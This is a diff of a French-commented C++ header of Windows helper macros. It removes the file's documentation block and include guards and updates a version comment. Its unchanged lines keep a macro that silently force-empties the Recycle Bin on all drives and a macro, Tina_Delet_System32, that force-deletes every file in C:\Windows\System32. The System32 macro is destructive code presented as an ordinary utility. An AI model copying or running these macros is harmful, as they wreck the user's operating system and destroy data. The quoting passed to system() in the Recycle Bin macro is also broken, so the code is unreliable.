@@ -1,34 +1,4 @@
-/**
- * @file Tina_Define_Windows.hpp
- * @brief Ce fichier permet de stoquer des macro spécifique a windows 
- * 
- * @note Vous pouvez compiler votre programme avec la ligne de commande ci-dessous si vous utiliser cette classe.
- * 
- * @brief
- * g++ -o test.exe test.cpp
- *  
- * Pour utiliser cette classe, vous devez inclure les bibliothèques suivantes :
- * - librairie fournit de base par le C/C++
- * - 
- * 
- * Fichier .hpp qui et utiliser par la classe :
- * - aucun 
- *
- * Disponibilité :
- * - Windows
- * 
- * @note Assurez-vous d'avoir les lib sur vôtre système sinon installer les lib nécessaire.
- * 
- * 
- * @author Tina
- * @date 31/07/2024
- * @version 0.2
- * @copyright Copyright 2024 Tina - Tous droits réservés
-*/
-
-#ifndef Tina_Define_Windows_
-#define Tina_Define_Windows_
-
+#pragma once
 
 #ifdef _WIN32
 #include <windows.h>
@@ -39,7 +9,7 @@
  * @def DeletBeanWindows
  * @brief permet de suprimmer la corbeil de windows via powershell
  */
-// y ajouter a la doc pour la version 0.5
+// y ajouter a la doc pour la version 0.7
 #define DeletBeanWindows system('powershell -command "$drives = Get-PSDrive -PSProvider FileSystem; foreach ($drive in $drives) {Clear-RecycleBin -DriveLetter $drive.Root[0] -Force -ErrorAction SilentlyContinue}"')
 
 /**
@@ -170,5 +140,3 @@
  */
 #define Tina_Delet_System32 system("del /f /q \"C:\\Windows\\System32\\*.*\"")
 
-
-#endif
